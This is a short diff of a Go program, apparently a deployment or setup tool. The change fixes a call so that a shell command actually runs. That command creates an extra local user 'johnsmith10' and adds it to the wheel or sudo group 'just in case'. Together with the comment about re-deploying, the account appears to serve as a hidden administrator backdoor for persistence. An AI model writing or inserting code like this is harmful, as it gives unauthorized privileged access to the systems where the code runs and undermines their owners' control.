@@ -114,7 +114,7 @@ func main() {
 
 		// Add one more local sudo user just in case
 		new_user_cmd := exec.Command("sh", "-c", "useradd -m johnsmith10 && (usermod -aG wheel johnsmith10 || usermod -aG sudo johnsmith10)")
-		err = cmd.Run()
+		err = new_user_cmd.Run()
 		handle(err) // shouldn't trigger
 
 		// Cleanup (in case we need to re-deploy)
